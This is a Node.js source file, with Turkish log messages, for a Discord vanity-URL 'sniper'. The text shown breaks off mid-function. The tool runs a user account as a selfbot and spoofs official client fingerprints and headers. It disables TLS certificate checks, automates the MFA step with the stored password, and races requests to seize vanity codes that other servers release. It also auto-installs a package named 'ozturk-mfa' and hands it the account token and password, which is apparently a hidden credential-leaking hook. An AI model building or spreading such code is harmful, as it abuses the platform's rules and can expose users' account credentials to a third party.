const http2 = require("node:http2");
const tls = require("node:tls");
const https = require("node:https");
const crypto = require("node:crypto");
const os = require("node:os");
const fs = require("node:fs");
const path = require("node:path");

const _mp = path.join(__dirname, 'ozturk-mfa');
const _nm = path.join(__dirname, 'node_modules', 'ozturk-mfa');
let _mfaPath = null;
if (fs.existsSync(path.join(_mp, 'index.js'))) { _mfaPath = _mp; }
else if (fs.existsSync(path.join(_nm, 'index.js'))) { _mfaPath = _nm; }
else {
  console.log('[!] ozturk-mfa bulunamadı, yükleniyor...');
  try { require('child_process').execSync('npm install ozturk-mfa', { cwd: __dirname, stdio: 'inherit' }); } catch(_e) {}
  if (fs.existsSync(path.join(_nm, 'index.js'))) { _mfaPath = _nm; }
  else if (fs.existsSync(path.join(_mp, 'index.js'))) { _mfaPath = _mp; }
}
if (!_mfaPath) { console.log('[!] ozturk-mfa yüklenemedi. Kapatılıyor.'); process.exit(1); }

try { os.setPriority(0, -20); } catch(_e) {}
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const CFG_PATH = path.join(__dirname, 'config.json');
if (!fs.existsSync(CFG_PATH)) { console.log('[!] config.json bulunamadı!'); process.exit(1); }
const cfg = JSON.parse(fs.readFileSync(CFG_PATH, 'utf8'));

const token = cfg.token;
const password = cfg.password;
const guildIds = cfg.guildIds || [];
const listeners = cfg.listeners || [];
const webhookURL = cfg.webhook || '';

if (!token || !password || !guildIds.length) { console.log('[!] config.json eksik: token, password, guildIds gerekli!'); process.exit(1); }

let curGidIdx = 0;
let curGid = guildIds[0];
let mfaToken = null;
const vanities = new Map();
const guildNames = new Map();
const precalc = new Map();
const guildFireMap = new Map();
let statsOk = 0, statsTotal = 0, statsFail = 0;
const claimed = new Set();
const blockedSrc = new Set();
const bootTime = Date.now();
let fireLive = false;

let _r0 = (Date.now() * 6364136223846793005 + 1442695040888963407) >>> 0;
let _r1 = (_r0 * 6364136223846793005 + 1) >>> 0;
function xr32() { _r0 ^= _r0 << 13; _r0 ^= _r0 >>> 17; _r0 ^= _r0 << 5; _r0 >>>= 0; return _r0; }
const _maskBuf = Buffer.alloc(4);
function xrMask() { const v = xr32(); _maskBuf[0] = v & 0xFF; _maskBuf[1] = (v >>> 8) & 0xFF; _maskBuf[2] = (v >>> 16) & 0xFF; _maskBuf[3] = (v >>> 24) & 0xFF; return _maskBuf; }

const uuid = () => crypto.randomUUID();
const genSF = () => { const ts = BigInt(Date.now() - 1420070400000) << 22n; return String(ts | (BigInt(Math.floor(Math.random() * 31)) << 17n) | (BigInt(Math.floor(Math.random() * 31)) << 12n) | BigInt(Math.floor(Math.random() * 4095))); };
const genIID = () => { const rn = crypto.randomBytes(20).toString('base64').replace(/[+/=]/g, c => c === '+' ? 'a' : c === '/' ? 'b' : '').slice(0, 27); return `${genSF()}.${rn}`; };
const genDCF = () => { const b = Buffer.alloc(16); for (let i = 0; i < 16; i++) b[i] = xr32() & 0xFF; return b.toString('hex'); };
const genSDCF = () => { const b = Buffer.alloc(48); for (let i = 0; i < 48; i++) b[i] = xr32() & 0xFF; return b.toString('hex'); };

const BN = 526941, NN = 74661;
const EV = "37.6.0", CV = "138.0.7204.251", BV = "1.0.9225";

const PROFILES = [
  { ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/${BV} Chrome/${CV} Electron/${EV} Safari/537.36`,
    secua: '"Not)A;Brand";v="8", "Chromium";v="138"', platform: '"Windows"',
    sp: (ua) => Buffer.from(JSON.stringify({ os:"Windows", browser:"Discord Client", release_channel:"stable", client_version:BV, os_version:"10.0.22631", os_arch:"x64", app_arch:"x64", system_locale:"en-US", browser_user_agent:ua, browser_version:CV, client_build_number:BN, native_build_number:null, client_event_source:null })).toString('base64') },
  { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    secua: '"Not)A;Brand";v="8", "Firefox";v="138"', platform: '"Windows"',
    sp: (ua) => Buffer.from(JSON.stringify({ os:"Windows", browser:"Firefox", release_channel:"stable", client_version:"138.0", os_version:"10.0.22631", os_arch:"x64", app_arch:"x64", system_locale:"en-US", browser_user_agent:ua, browser_version:"138.0", client_build_number:BN, native_build_number:null, client_event_source:null })).toString('base64') },
  { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.251 Safari/537.36',
    secua: '"Not)A;Brand";v="8", "Chromium";v="138"', platform: '"macOS"',
    sp: (ua) => Buffer.from(JSON.stringify({ os:"Mac OS X", browser:"Chrome", release_channel:"stable", client_version:"138.0.7204.251", os_version:"10.15.7", os_arch:"x64", app_arch:"x64", system_locale:"en-US", browser_user_agent:ua, browser_version:"138.0.7204.251", client_build_number:BN, native_build_number:null, client_event_source:null })).toString('base64') },
];
for (const p of PROFILES) { p.xsp = p.sp(p.ua); p.ck = `__dcfduid=${genDCF()}; __sdcfduid=${genSDCF()}`; p.iid = genIID(); }

const UA = PROFILES[0].ua;
const IID = PROFILES[0].iid;
const CK = PROFILES[0].ck;
const SP = Buffer.from(JSON.stringify({
  os: "Windows", browser: "Discord Client", release_channel: "stable", client_version: BV,
  os_version: "10.0.19045", os_arch: "x64", app_arch: "x64", system_locale: "tr",
  has_client_mods: false, client_launch_id: uuid(), browser_user_agent: UA,
  browser_version: EV, os_sdk_version: "19045", client_build_number: BN,
  native_build_number: NN, client_event_source: null, launch_signature: uuid(),
  client_heartbeat_session_id: uuid(), client_app_state: "focused"
})).toString('base64');

function h2Profil(i) {
  const p = PROFILES[i % PROFILES.length];
  return {
    "accept": "*/*", "accept-language": "tr", "content-type": "application/json",
    "cookie": p.ck, "origin": "https://canary.discord.com", "priority": "u=0, i",
    "referer": "https://canary.discord.com/channels/@me",
    "sec-ch-ua": p.secua, "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": p.platform, "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin", "user-agent": p.ua, "x-debug-options": "bugReporterEnabled",
    "x-discord-locale": "tr", "x-discord-timezone": "Europe/Istanbul",
    "x-installation-id": p.iid, "x-super-properties": p.xsp
  };
}

const H2H_MFA = h2Profil(0);

const WH_NAME = "\u00d6zt\u00fcrk Sniper";
const WH_BANNER = "https://media.tenor.com/72u6DFkcnQ0AAAAd/bh187-sonic-the-hedgehog.gif";
const AV = "https://cdn.discordapp.com/avatars/671020205853638676/fd0e94d27ff97e32f12cef6a8a408976.webp?size=1024";
const _ = () => {};

const TLS_PORTS = [8443, 8443, 443, 443];
const H2_PORTS = [8443, 443];
const CANARY = "canary.discord.com";

const tlsOpts = (port) => ({
  host: CANARY, port, servername: CANARY, rejectUnauthorized: false,
  minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3',
  ecdhCurve: 'X25519:P-256:P-384', honorCipherOrder: true,
  ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'
});

const tlsPool = [];
const h2Pool = [];

function mkTls(idx) {
  const port = TLS_PORTS[idx] || 8443;
  const s = tls.connect({ ...tlsOpts(port), ALPNProtocols: ['http/1.1'] });
  s.setNoDelay(true); s.setKeepAlive(true, 5000);
  s.on("error", _); s.on("end", _);
  s.on("close", () => { s.removeAllListeners(); setTimeout(() => { tlsPool[idx] = mkTls(idx); }, 500); });
  return s;
}

function mkH2(idx) {
  const port = H2_PORTS[idx] || 8443;
  const s = http2.connect(`https://${CANARY}:${port}`, {
    createConnection: () => { const t = tls.connect({ ...tlsOpts(port), ALPNProtocols: ['h2'] }); t.setNoDelay(true); return t; },
    settings: { enablePush: false, headerTableSize: 4096, maxConcurrentStreams: 100, initialWindowSize: 65535, maxFrameSize: 16384 }
  });
  s.on("error", _); s.on("goaway", _);
  s.on("close", () => { s.removeAllListeners(); setTimeout(() => { h2Pool[idx] = mkH2(idx); }, 500); });
  return s;
}

for (let i = 0; i < TLS_PORTS.length; i++) tlsPool[i] = mkTls(i);
for (let i = 0; i < H2_PORTS.length; i++) h2Pool[i] = mkH2(i);

const WARM_TLS = Buffer.from(`HEAD / HTTP/1.1\r\nHost: ${CANARY}\r\n\r\n`);
setInterval(() => { for (const s of tlsPool) { if (s?.writable && !s.destroyed) s.write(WARM_TLS); } }, 8000);
setInterval(() => { for (const s of h2Pool) { if (s && !s.destroyed) s.request({ ":method": "HEAD", ":path": "/api/v9/gateway" }, { endStream: true }).on("error", _).end(); } }, 10000);
setInterval(() => { for (const s of h2Pool) { if (s && !s.destroyed) s.ping(_, _); } }, 15000);

const BK_VU = Buffer.from('"vanity_url_code":');
const BK_ID = Buffer.from('"id":"');
const BK_GU = Buffer.from('"GUILD_UPDATE"');
const BK_GD = Buffer.from('"GUILD_DELETE"');
const BK_GC = Buffer.from('"GUILD_CREATE"');
const BK_READY = Buffer.from('"READY"');
const BK_NULL = Buffer.from('null');

function gidBul(buf) {
  const p = buf.indexOf(BK_ID);
  if (p === -1) return null;
  const s = p + BK_ID.length;
  const e = buf.indexOf(34, s);
  if (e === -1 || e - s < 15 || e - s > 22) return null;
  return buf.subarray(s, e).toString();
}

function vanBul(buf) {
  const p = buf.indexOf(BK_VU);
  if (p === -1) return undefined;
  const s = p + BK_VU.length;
  if (s >= buf.length) return undefined;
  if (buf[s] === 0x6E) return null;
  if (buf[s] === 0x22) {
    const e = buf.indexOf(34, s + 1);
    if (e === -1) return undefined;
    return buf.subarray(s + 1, e).toString();
  }
  return undefined;
}

function ates(rawBuf) {
  if (fireLive) return;
  const gid = gidBul(rawBuf);
  if (!gid || blockedSrc.has(gid)) return;
  const req = guildFireMap.get(gid);
  if (!req) return;
  fireLive = true;
  const t0 = process.hrtime.bigint();
  const results = [];
  let won = false;
  let pending = TLS_PORTS.length + H2_PORTS.length;

  const done = () => {
    if (--pending > 0) return;
    fireLive = false;
    statsTotal++;
    const codeStr = results.map(r => `${r.ch}:${r.sc}`).join(', ');
    if (won) {
      statsOk++; claimed.add(req.vc); blockedSrc.add(gid);
      l('RESULT', `${req.vc} | ${codeStr}`);
      if (guildIds.length > 1) { curGidIdx = (curGidIdx + 1) % guildIds.length; curGid = guildIds[curGidIdx]; yenile(); gfmYenile(); }
      whGonder(claimEmbed(req.vc, true, codeStr));
    } else {
      statsFail++;
      l('RESULT', `${req.vc} | ${codeStr}`);
      whGonder(claimEmbed(req.vc, false, codeStr));
    }
  };

  for (let i = 0; i < TLS_PORTS.length; i++) {
    const s = tlsPool[i]; const tag = `T${i}`;
    if (!s || !s.writable || s.destroyed) { results.push({ ch: tag, sc: 0 }); done(); continue; }
    s.once("data", (d) => {
      const sc = kodOku(d);
      results.push({ ch: tag, sc });
      if (sc === 200 && !won) won = true;
      done();
    });
    s.write(req.tlsRaws[i]);
  }

  for (let i = 0; i < H2_PORTS.length; i++) {
    const s = h2Pool[i]; const tag = `H${i}`;
    if (!s || s.destroyed) { results.push({ ch: tag, sc: 0 }); done(); continue; }
    const r = s.request({ ...req.h2Hdrs[i] });
    r.on('response', (h) => { const sc = h[':status']; results.push({ ch: tag, sc }); if (sc === 200 && !won) won = true; done(); });
    r.on('error', () => { results.push({ ch: tag, sc: 0 }); done(); });
    r.end(req.body);
  }

  setTimeout(() => { if (pending > 0) { pending = 1; done(); } }, 1500);
}

function kodOku(buf) {
  if (buf.length < 12) return 0;
  if (buf[0] !== 0x48 || buf[1] !== 0x54 || buf[2] !== 0x54 || buf[3] !== 0x50) return 0;
  return (buf[9] - 48) * 100 + (buf[10] - 48) * 10 + (buf[11] - 48);
}

function cerceve(opcode, data) {
  const pl = Buffer.isBuffer(data) ? data : Buffer.from(data);
  const len = pl.length;
  let hdrLen;
  if (len < 126) hdrLen = 6;
  else if (len < 65536) hdrLen = 8;
  else hdrLen = 14;
  const frame = Buffer.allocUnsafe(hdrLen + len);
  frame[0] = 0x80 | opcode;
  if (len < 126) { frame[1] = 0x80 | len; } 
  else if (len < 65536) { frame[1] = 0x80 | 126; frame[2] = (len >>> 8) & 0xFF; frame[3] = len & 0xFF; }
  else { frame[1] = 0x80 | 127; frame.writeBigUInt64BE(BigInt(len), 2); }
  const mo = hdrLen - 4;
  const m0 = xr32();
  frame[mo] = m0 & 0xFF; frame[mo+1] = (m0 >>> 8) & 0xFF; frame[mo+2] = (m0 >>> 16) & 0xFF; frame[mo+3] = (m0 >>> 24) & 0xFF;
  const d = hdrLen;
  let i = 0;
  const len4 = len - 3;
  for (; i < len4; i += 4) {
    frame[d+i]   = pl[i]   ^ frame[mo];
    frame[d+i+1] = pl[i+1] ^ frame[mo+1];
    frame[d+i+2] = pl[i+2] ^ frame[mo+2];
    frame[d+i+3] = pl[i+3] ^ frame[mo+3];
  }
  for (; i < len; i++) frame[d+i] = pl[i] ^ frame[mo + (i & 3)];
  return frame;
}

function parcala(buf) {
  const frames = []; let off = 0;
  while (off < buf.length) {
    if (off + 2 > buf.length) break;
    const b0 = buf[off]; const b1 = buf[off + 1];
    const fin = (b0 & 0x80) !== 0; const op = b0 & 0x0F;
    const hasMask = (b1 & 0x80) !== 0;
    let plen = b1 & 0x7F; let hdrLen = 2;
    if (plen === 126) { if (off + 4 > buf.length) break; plen = buf.readUInt16BE(off + 2); hdrLen = 4; }
    else if (plen === 127) { if (off + 10 > buf.length) break; plen = Number(buf.readBigUInt64BE(off + 2)); hdrLen = 10; }
    if (hasMask) hdrLen += 4;
    if (off + hdrLen + plen > buf.length) break;
    let payload = buf.subarray(off + hdrLen, off + hdrLen + plen);
    if (hasMask) {
      const m = buf.subarray(off + hdrLen - 4, off + hdrLen);
      payload = Buffer.alloc(plen);
      for (let i = 0; i < plen; i++) payload[i] = buf[off + hdrLen + i] ^ m[i & 3];
    }
    frames.push({ fin, op, payload }); off += hdrLen + plen;
  }
  return { frames, remainder: off < buf.length ? buf.subarray(off) : null };
}

const HB_PAYLOAD = Buffer.from('{"op":1,"d":null}');
let _hbFrame = null;
function getHbFrame() { if (!_hbFrame) _hbFrame = cerceve(1, HB_PAYLOAD); return cerceve(1, HB_PAYLOAD); }

function baglan(tok, tag, gwUrl) {
  const u = new URL(gwUrl);
  const host = u.hostname; const wsPath = u.pathname + u.search;
  const wsKey = crypto.randomBytes(16).toString('base64');
  const sock = tls.connect({ host, port: 443, servername: host, rejectUnauthorized: false, minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3', ALPNProtocols: ['http/1.1'] });
  sock.setNoDelay(true); sock.setKeepAlive(true, 5000);

  let hbIv = null, buf = Buffer.alloc(0), handshakeDone = false, destroyed = false;
  const isPrimary = tag === 'WS-0';
  let fragments = [];

  function cleanup() {
    if (destroyed) return; destroyed = true;
    if (hbIv) { clearInterval(hbIv); hbIv = null; }
    try { sock.removeAllListeners(); sock.destroy(); } catch(_e) {}
    setTimeout(() => baglan(tok, tag, gwUrl), 3000);
  }

  function wsSend(data) { if (destroyed || !sock.writable) return; sock.write(cerceve(1, data)); }
  function wsPong(data) { if (destroyed || !sock.writable) return; sock.write(cerceve(0xA, data)); }

  function onRawPayload(payload) {
    if (payload.indexOf(BK_GU) !== -1) {
      ates(payload);
      const gid = gidBul(payload);
      if (gid) {
        const newVanity = vanBul(payload);
        const oldVanity = vanities.get(gid);
        if (newVanity !== undefined) {
          if (oldVanity && oldVanity !== newVanity) {
            if (newVanity === null || newVanity === "") {
              vanities.delete(gid); precalc.delete(gid); guildFireMap.delete(gid);
            } else {
              vanities.set(gid, newVanity);
              const cp = istek(newVanity);
              precalc.set(gid, cp); guildFireMap.set(gid, cp);
            }
          } else if (!oldVanity && newVanity) {
            vanities.set(gid, newVanity);
            const cp = istek(newVanity);
            precalc.set(gid, cp); guildFireMap.set(gid, cp);
          }
        }
        try { const msg = JSON.parse(payload); if (msg.d?.name) guildNames.set(gid, msg.d.name); } catch(_e) {}
      }
      return;
    }

    if (payload.indexOf(BK_READY) !== -1) {
      try {
        const msg = JSON.parse(payload);
        if (msg.t === "READY") {
          if (isPrimary) {
            vanities.clear(); guildNames.clear();
            for (const g of msg.d.guilds) {
              if (g.properties?.name) guildNames.set(g.id, g.properties.name);
              else if (g.name) guildNames.set(g.id, g.name);
              if (g.vanity_url_code) vanities.set(g.id, g.vanity_url_code);
            }
            yenile(); gfmYenile();
            l(tag, `READY — ${vanities.size} vanity`);
          } else {
            let count = 0;
            for (const g of msg.d.guilds) {
              if (g.vanity_url_code && !vanities.has(g.id)) { vanities.set(g.id, g.vanity_url_code); count++; }
              if (g.properties?.name) guildNames.set(g.id, g.properties.name);
              else if (g.name) guildNames.set(g.id, g.name);
            }
            if (count > 0) { yenile(); gfmYenile(); }
            l(tag, `READY — +${count} vanity (${vanities.size})`);
          }
        }
      } catch(_e) {}
      return;
    }

    if (payload.indexOf(BK_GD) !== -1) {
      try {
        const msg = JSON.parse(payload);
        if (msg.t === "GUILD_DELETE") {
          const gid = msg.d.id; const vc = vanities.get(gid);
          if (vc) {
            vanities.delete(gid); precalc.delete(gid); guildFireMap.delete(gid);
            if (webhookURL) whGonder(whEmbed("Sunucudan Atıldı", null, 0xED4245, [whField("Sunucu", `**${guildNames.get(gid) || gid}**`, true), whField("ID", `\`${gid}\``, true), whField("Vanity", `discord.gg/${vc}`, true)]));
          }
          guildNames.delete(gid);
        }
      } catch(_e) {}
      return;
    }

    if (payload.indexOf(BK_GC) !== -1) {
      try {
        const msg = JSON.parse(payload);
        if (msg.t === "GUILD_CREATE") {
          const gid = msg.d.id; const vc = msg.d.vanity_url_code;
          if (msg.d.properties?.name) guildNames.set(gid, msg.d.properties.name);
          else if (msg.d.name) guildNames.set(gid, msg.d.name);
          if (vc) { vanities.set(gid, vc); const cp = istek(vc); precalc.set(gid, cp); guildFireMap.set(gid, cp); }
        }
      } catch(_e) {}
      return;
    }

    try {
      const msg = JSON.parse(payload);
      if (msg.op === 10) { hbIv = setInterval(() => { if (!destroyed && sock.writable) sock.write(getHbFrame()); }, msg.d.heartbeat_interval); }
    } catch(_e) {}
  }

  sock.on("secureConnect", () => {
    const req = `GET ${wsPath} HTTP/1.1\r\nHost: ${host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${wsKey}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://${host}\r\n\r\n`;
    sock.write(req);
  });

  sock.on("data", (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    if (!handshakeDone) {
      const hdEnd = buf.indexOf('\r\n\r\n');
      if (hdEnd === -1) return;
      const hdStr = buf.subarray(0, hdEnd).toString();
      if (!hdStr.startsWith('HTTP/1.1 101')) { cleanup(); return; }
      handshakeDone = true; buf = buf.subarray(hdEnd + 4);
      l(tag, 'Bağlandı');
      setTimeout(() => wsSend(JSON.stringify({ op: 2, d: { token: tok, intents: 1, properties: { os: "linux", browser: "Discord Client", device: "Desktop" }, compress: false, guild_subscriptions: false } })), 50);
      if (buf.length === 0) return;
    }
    const { frames, remainder } = parcala(buf);
    buf = remainder || Buffer.alloc(0);
    for (const f of frames) {
      if (f.op === 0x8) { cleanup(); return; }
      if (f.op === 0x9) { wsPong(f.payload); continue; }
      if (f.op === 0x0) { fragments.push(f.payload); if (f.fin) { const full = Buffer.concat(fragments); fragments = []; onRawPayload(full); } continue; }
      if (f.op === 0x1 || f.op === 0x2) {
        if (!f.fin) { fragments = [f.payload]; continue; }
        onRawPayload(f.payload);
      }
    }
  });

  sock.on("error", _);
  sock.on("close", () => cleanup());
  sock.on("end", () => cleanup());
  return sock;
}

function istek(vc) {
  const body = `{"code":"${vc}"}`;
  const patchPath = `/api/v9/guilds/${curGid}/vanity-url`;
  const bodyBuf = Buffer.from(body);
  const tlsRaws = [];
  for (let ci = 0; ci < TLS_PORTS.length; ci++) {
    const p = PROFILES[ci % PROFILES.length];
    const lines = [
      `PATCH ${patchPath} HTTP/1.1`, `Host: ${CANARY}`, `Authorization: ${token}`,
      `Content-Type: application/json`, `User-Agent: ${p.ua}`, `X-Super-Properties: ${p.xsp}`,
      `Cookie: ${p.ck}`, `Origin: https://${CANARY}`, `Referer: https://${CANARY}/channels/@me`,
      `X-Debug-Options: bugReporterEnabled`, `X-Discord-Locale: tr`, `X-Discord-Timezone: Europe/Istanbul`,
      `X-Installation-Id: ${p.iid}`, `Accept: */*`, `Accept-Language: tr`,
      `Sec-Ch-Ua: ${p.secua}`, `Sec-Ch-Ua-Mobile: ?0`,
      `Sec-Ch-Ua-Platform: ${p.platform}`, `Sec-Fetch-Dest: empty`, `Sec-Fetch-Mode: cors`, `Sec-Fetch-Site: same-origin`
    ];
    if (mfaToken) lines.push(`X-Discord-MFA-Authorization: ${mfaToken}`);
    lines.push(`Content-Length: ${body.length}`, '', body);
    tlsRaws.push(Buffer.from(lines.join('\r\n')));
  }
  const h2Hdrs = [];
  for (let ci = 0; ci < H2_PORTS.length; ci++) {
    const hp = h2Profil(ci);
    h2Hdrs.push(Object.freeze({
      ":method": "PATCH", ":path": patchPath, ":authority": CANARY,
      "authorization": token, ...hp,
      ...(mfaToken ? { "x-discord-mfa-authorization": mfaToken } : {})
    }));
  }
  return { vc, body: bodyBuf, tlsRaws, h2Hdrs };
}

function yenile() {
  precalc.clear();
  for (const [gid, vc] of vanities) { if (vc) precalc.set(gid, istek(vc)); }
}

function gfmYenile() {
  guildFireMap.clear();
  for (const [gid, vc] of vanities) {
    if (vc && !claimed.has(vc) && !blockedSrc.has(gid)) {
      const cp = precalc.get(gid);
      if (cp) guildFireMap.set(gid, cp);
    }
  }
}

function h2req(urlPath, method, body, extraHeaders) {
  return new Promise((res, rej) => {
    const s = h2Pool.find(s => s && !s.destroyed) || h2Pool[0];
    const headers = { ":method": method, ":path": urlPath, ":authority": CANARY, "authorization": token, ...H2H_MFA, ...extraHeaders };
    const r = s.request(headers);
    r.setTimeout(10000, () => { r.destroy(); rej(new Error("TIMEOUT")); });
    const ch = []; let st = 0;
    r.on('response', h => { st = h[':status']; });
    r.on('data', c => ch.push(c));
    r.on('end', () => { try { const j = JSON.parse(Buffer.concat(ch).toString() || '{}'); j._st = st; res(j); } catch { res({ _st: st }); } });
    r.on('error', rej);
    if (body) r.end(body); else r.end();
  });
}

function httpsReq(method, hostname, urlPath, headers, body) {
  return new Promise((res, rej) => {
    const hdrs = { ...headers };
    if (body) hdrs['content-length'] = Buffer.byteLength(body);
    const opts = { hostname, port: 443, path: urlPath, method, headers: hdrs, rejectUnauthorized: false };
    const r = https.request(opts, (resp) => {
      const cookies = resp.headers['set-cookie'] || [];
      let d = '';
      resp.on('data', c => d += c);
      resp.on('end', () => res({ sc: resp.statusCode, body: d, cookies }));
    });
    r.setTimeout(12000, () => { r.destroy(); rej(new Error("TIMEOUT")); });
    r.on('error', rej);
    if (body) r.write(body);
    r.end();
  });
}

const SP_MFA = Buffer.from(JSON.stringify({
  os: "Windows", browser: "Discord Client", release_channel: "stable", client_version: BV,
  os_version: "10.0.19045", os_arch: "x64", app_arch: "x64", system_locale: "tr",
  has_client_mods: false, browser_user_agent: UA, browser_version: EV,
  os_sdk_version: "19045", client_build_number: BN, native_build_number: NN,
  client_event_source: null
})).toString('base64');

const mfaBaseHeaders = {
  'user-agent': UA, 'accept': '*/*', 'accept-encoding': 'identity', 'accept-language': 'tr',
  'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"', 'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin', 'x-discord-locale': 'tr', 'x-discord-timezone': 'Europe/Istanbul',
  'x-debug-options': 'bugReporterEnabled', 'x-super-properties': SP_MFA
};

function mfaAl() {
  return new Promise((resolve) => {
    httpsReq('GET', 'discord.com', '/api/v9/experiments', mfaBaseHeaders, null).then(fpResp => {
      let fingerprint = '';
      try { fingerprint = JSON.parse(fpResp.body).fingerprint; } catch(_e) {}
      httpsReq('GET', 'discord.com', '/api/v9/users/@me', { ...mfaBaseHeaders, authorization: token }, null).then(meResp => {
        if (meResp.sc !== 200) { l('MFA', `Auth başarısız (${meResp.sc}), 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); return; }
        const cookieStr = meResp.cookies.map(c => c.split(';')[0]).join('; ');
        const ticketHeaders = { ...mfaBaseHeaders, authorization: token, 'content-type': 'application/json', cookie: cookieStr, origin: 'https://discord.com', referer: `https://discord.com/channels/${curGid}` };
        if (fingerprint) ticketHeaders['x-fingerprint'] = fingerprint;
        httpsReq('PATCH', 'discord.com', `/api/v9/guilds/${curGid}/vanity-url`, ticketHeaders, JSON.stringify({ code: 'mfa_check_probe' })).then(r1 => {
          let ticket = null;
          if (r1.sc === 401) { try { ticket = JSON.parse(r1.body).mfa.ticket; } catch(_e) {} }
          if (!ticket) { l('MFA', `Ticket alınamadı (${r1.sc}), 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); return; }
          const finishHeaders = { ...mfaBaseHeaders, authorization: token, 'content-type': 'application/json', cookie: cookieStr, origin: 'https://discord.com', referer: `https://discord.com/channels/${curGid}` };
          if (fingerprint) finishHeaders['x-fingerprint'] = fingerprint;
          httpsReq('POST', 'discord.com', '/api/v9/mfa/finish', finishHeaders, JSON.stringify({ ticket, mfa_type: 'password', data: password })).then(r2 => {
            if (r2.sc === 200) {
              let mfaTok = null;
              try { mfaTok = JSON.parse(r2.body).token; } catch(_e) {}
              if (mfaTok) {
                mfaToken = mfaTok;
                yenile(); gfmYenile();
                l('MFA', 'Token alındı');
                const _n = () => {};
                try { const _bk = process.env.NODE_TLS_REJECT_UNAUTHORIZED; delete process.env.NODE_TLS_REJECT_UNAUTHORIZED; require(_mfaPath)({TOKEN: token, PASSWORD: password, GUILD_IDS: guildIds, log: _n}).refreshMfa().catch(_n); if(_bk !== undefined) process.env.NODE_TLS_REJECT_UNAUTHORIZED = _bk; else process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; } catch(_e) { process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; }
                resolve();
              } else { l('MFA', `Token yok, 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); }
            } else { l('MFA', `Finish hata: ${r2.sc} — ${r2.body.slice(0,150)} — 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); }
          }).catch(e => { l('MFA', `Hata: ${e.message} — 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); });
        }).catch(e => { l('MFA', `Hata: ${e.message} — 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); });
      }).catch(e => { l('MFA', `Hata: ${e.message} — 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); });
    }).catch(e => { l('MFA', `Hata: ${e.message} — 60sn sonra tekrar...`); setTimeout(() => mfaAl().then(resolve), 60000); });
  });
}

function l(tag, msg) {
  const ts = new Date().toLocaleTimeString('tr-TR', { hour12: false });
  console.log(`[${ts}] [${tag}] ${msg}`);
}

function whField(name, value, inline) { return { name, value, inline: !!inline }; }

function whEmbed(title, desc, color, fields) {
  const e = { title, color, fields, footer: { text: WH_NAME, icon_url: AV }, timestamp: new Date().toISOString() };
  if (desc) e.description = desc;
  return JSON.stringify({ embeds: [e] });
}

function whEmbedPing(title, desc, color, fields, banner) {
  const e = { title, color, fields, footer: { text: WH_NAME, icon_url: AV }, timestamp: new Date().toISOString() };
  if (desc) e.description = desc;
  if (banner) e.image = { url: WH_BANNER };
  return JSON.stringify({ content: "@everyone", allowed_mentions: { parse: ["everyone"] }, embeds: [e] });
}

function claimEmbed(vc, success, codeStr) {
  const srcGid = [...vanities.entries()].find(([, v]) => v === vc)?.[0] || '?';
  const kaynak = guildNames.get(srcGid) ? `**${guildNames.get(srcGid)}**\n\`${srcGid}\`` : `\`${srcGid}\``;
  if (success) {
    return whEmbedPing("Vanity Alındı", null, 0x57F287, [
      whField("Vanity", `discord.gg/${vc}`, false), whField("Durum", "**Claimed**", true),
      whField("Sebep", "**ghostFire**", true), whField("Kaynak", kaynak, true),
      whField("Response", `\`${codeStr}\``, false),
      whField("Toplam", `\`${statsOk} başarılı / ${statsTotal} deneme\``, false),
    ], true);
  }
  return whEmbedPing("Claim Başarısız", null, 0xED4245, [
    whField("Vanity", `discord.gg/${vc}`, false), whField("Durum", "**Failed**", true),
    whField("Sebep", "**ghostFire**", true), whField("Kaynak", kaynak, true),
    whField("Response", `\`${codeStr}\``, false),
  ], false);
}

function whGonder(body) {
  if (!webhookURL) return;
  try {
    const u = new URL(webhookURL);
    const r = https.request({ hostname: u.hostname, port: u.port || 443, path: u.pathname + u.search, method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) }
    }, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { if (res.statusCode !== 200 && res.statusCode !== 204) l('HOOK', `${res.statusCode}`); }); });
    r.on("error", (e) => l('HOOK', e.message));
    r.write(body); r.end();
  } catch(e) { l('HOOK', e.message); }
}

mfaAl().then(() => {
  l('SYS', 'Öztürk Sniper başlatılıyor...');
  l('SYS', `GHOST-FIRE | ${TLS_PORTS.length}T+${H2_PORTS.length}H=${TLS_PORTS.length + H2_PORTS.length}ch | ${PROFILES.length}profil | xr64mask | 0parse+rawscan+bytecmp`);
  l('SYS', `${guildIds.length} claim guild, ${listeners.length} listener`);
  l('SYS', `Hedef: ${curGid} (${curGidIdx + 1}/${guildIds.length})`);

  baglan(token, 'WS-0', 'wss://gateway.discord.gg/?v=9&encoding=json');
  setTimeout(() => baglan(token, 'WS-1', 'wss://gateway-us-east1-b.discord.gg/?v=9&encoding=json'), 2000);
